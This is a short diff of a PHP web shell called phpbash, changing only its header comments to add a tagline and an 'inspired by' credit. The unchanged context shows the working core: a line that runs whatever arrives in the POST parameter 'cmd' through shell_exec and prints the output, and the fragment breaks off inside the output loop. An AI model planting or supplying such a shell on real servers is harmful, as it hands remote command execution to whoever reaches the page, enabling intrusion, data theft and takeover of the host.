@@ -1,5 +1,6 @@
 <?php
-/* phpbash by LAMINE AZINAKOU */
+/* phpbash by LAMINE AZINAKOU - Don't re-invent the wheel, Just re-align It */
+/* inspired by Alexander Reid (Rexel)  */
 if (ISSET($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
     foreach ($output as $line) {
